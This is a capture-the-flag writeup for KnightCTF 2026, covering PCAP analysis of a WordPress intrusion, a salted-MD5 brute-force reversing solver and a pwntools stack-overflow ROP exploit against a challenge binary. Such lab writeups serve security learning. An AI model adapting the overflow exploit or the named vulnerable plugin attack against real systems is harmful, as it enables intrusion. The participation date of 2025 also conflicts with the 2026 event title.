---
title: "KnightCTF 2026: Writeup"
date: 2026-01-27 23:50:00 +0530
categories: [CTF, Others]
tags: [ctf, writeups, cybersecurity, networking, forensics, pwn, reverse-engineering]
excerpt: "A writeup for KnightCTF 2026 challenges."
---

## TL;DR

* Participated in **KnightCTF 2026**, hosted by the Knight Squad community
* Solved challenges across **Networking, Reverse Engineering, and PWN**
* Focus areas: PCAP analysis, WordPress exploitation, hash-based reversing, basic ROP
* Core tools: Wireshark, Python, pwntools, IDA/Ghidra

Plus Ultra.

---

## Event Info

* **CTFtime:** [https://ctftime.org/event/3053](https://ctftime.org/event/3053)
* **Platform:** [https://2026.knightctf.com/](https://2026.knightctf.com/)

On **20 January 2025**, I participated in **KnightCTF 2026**, hosted by the Knight Squad community.
I played with my teammates from **\$cr1pt_K1dd13\$**.

This write-up covers the challenges I personally solved.

---

## Challenge Index

| Category            | Challenge                  | Flag Solved | Core Technique                  | Tools Used        |
| ------------------- | -------------------------- | ----------- | ------------------------------- | ----------------- |
| Networking          | Vulnerability Exploitation | ✅           | WordPress Plugin Fingerprinting | Wireshark, Google |
| Networking          | Exploitation               | ✅           | Web App Identification          | Wireshark         |
| Reverse Engineering | E4sy P3asy                 | ✅           | Hash Reversal / Brute Force     | Python, hashlib   |
| PWN                 | Knight Squad Academy       | ✅           | Buffer Overflow + ROP           | pwntools, GDB     |

---

## Networking

### **Exploitation**

**Tools:** Wireshark

**Description**
The attacker identified a web application running on the server.
Find the application version and the username observed in the capture.

**Flag:** `KCTF{6.9_kadmin_user}`

**Write-up**

From HTTP request headers and WordPress REST API traffic, I identified:

* WordPress version: **6.9**
* Username: **kadmin_user**

The username appeared in authentication attempts and admin-related endpoint access.

---

### **Vulnerability Exploitation**

**Tools:** Wireshark, Google

**Description**
Our web application was compromised through a vulnerable plugin.
The attacker exploited a known vulnerability to gain initial access.
Identify the vulnerable plugin and its version.

**Flag:** `KCTF{social_warfare_3.5.2}`

**Write-up**

I analyzed the provided PCAP and filtered HTTP traffic related to WordPress enumeration and plugin scanning.
Multiple plugin paths were requested, but most were repeated probes or returned identical responses.

One plugin stood out:

```
/wp-content/plugins/social-warfare/
```

Correlating version-specific requests and response metadata showed the attacker targeting **Social Warfare v3.5.2**.

A quick CVE lookup confirmed that this version contains a known unauthenticated RCE vulnerability.

---

## Reverse Engineering

### **E4sy P3asy**

**Tools:** Python, hashlib

**Description**
Reverse the binary.

**Flag:** `KCTF{_L0TS_oF_bRuTE_foRCE_:P}`

**Write-up**

The binary accepts user input and validates it character-by-character using MD5 hashes.

Each character is hashed as:

```
MD5( salt + index + character )
```

Two salts appear in the binary:

* Real: `KnightCTF_2026_s@lt`
* Decoy: `G00gleCTF_s@lt_2026`

After extracting the real salt and the list of target hashes, I brute-forced each character position using Python.

```python
#!/usr/bin/env python3
import hashlib
import string

hashes = [
    "781011edfb2127ee5ff82b06bb1d2959",
    "4cf891e0ddadbcaae8e8c2dc8bb15ea0",
    "d06d0cbe140d0a1de7410b0b888f22b4",
    "d44c9a9b9f9d1c28d0904d6a2ee3e109",
    "e20ab37bee9d2a1f9ca3d914b0e98f09",
    "d0beea4ce1c12190db64d10a82b96ef8",
    "ac87da74d381d253820bcf4e5f19fcea",
    "ce3f3a34a04ba5e5142f5db272b6cb1f",
    "13843aca227ef709694bbfe4e5a32203",
    "ca19a4c4eb435cb44d74c1e589e51a10",
    "19edec8e46bdf97e3018569c0a60baa3",
    "972e078458ce3cb6e32f795ff4972718",
    "071824f6039981e9c57725453e005beb",
    "66cd6098426b0e69e30e7fa360310728",
    "f78d152df5d277d0ab7d25fb7d1841f3",
    "dba3a36431c4aaf593566f7421abaa22",
    "8820bbdad85ebee06632c379231cfb6b",
    "722bc7cde7d548b81c5996519e1b0f0f",
    "c2862c390c830eb3c740ade576d64773",
    "94da978fe383b341f9588f9bab246774",
    "bea3bb724dbd1704cf45aea8e73c01e1",
    "ade2289739760fa27fd4f7d4ffbc722d",
    "3cd0538114fe416b32cdd814e2ee57b3",
]

SALT = "KnightCTF_2026_s@lt"

def find_char_for_hash(target_hash, salt, index):
    charset = string.printable + ''.join(chr(i) for i in range(128, 256))
    for c in charset:
        test_string = salt + str(index) + c
        md5_hash = hashlib.md5(test_string.encode('latin-1')).hexdigest()
        if md5_hash == target_hash:
            return c
    return None

flag_chars = []
for i, target_hash in enumerate(hashes):
    char = find_char_for_hash(target_hash, SALT, i)
    if char:
        flag_chars.append(char)
    else:
        break

print("KCTF{" + ''.join(flag_chars) + "}")
```

---

## PWN

### **Knight Squad Academy**

**Tools:** pwntools, GDB

**Description**
Its our academy... :D

**Flag:** `KCTF{_We3Lc0ME_TO_Knight_Squad_Academy_}`

**Write-up**

The binary contains a hidden `win()` function that prints the flag.
The vulnerable input reads 240 bytes into a 112-byte stack buffer.

Stack layout analysis:

* buffer: 0x70 bytes
* saved RBP: 8 bytes
* RIP offset: 0x78 (120 bytes)

I built a ROP chain to:

1. Align the stack
2. Set RDI to a magic value
3. Jump to `win()`

```python
#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'
context.log_level = 'info'

if args.REMOTE:
    p = remote('66.228.49.41', 5000)
else:
    p = process('./ksa_kiosk')

win_addr   = 0x4013ac
ret_gadget = 0x40101a
pop_rdi    = 0x40150b
magic_val  = 0x1337c0decafebeef

p.recvuntil(b'> ')
p.sendline(b'1')

p.recvuntil(b'> ')
p.sendline(b'TestCadet')

p.recvuntil(b'> ')
payload  = b'A' * 120
payload += p64(ret_gadget)
payload += p64(pop_rdi)
payload += p64(magic_val)
payload += p64(win_addr)

p.sendline(payload)
p.interactive()
```

---

## Conclusion

In KnightCTF 2026 I solved a clean mix of:

* PCAP-based forensics
* WordPress exploitation
* lightweight reversing
* beginner-friendly ROP

Plus Ultra.

---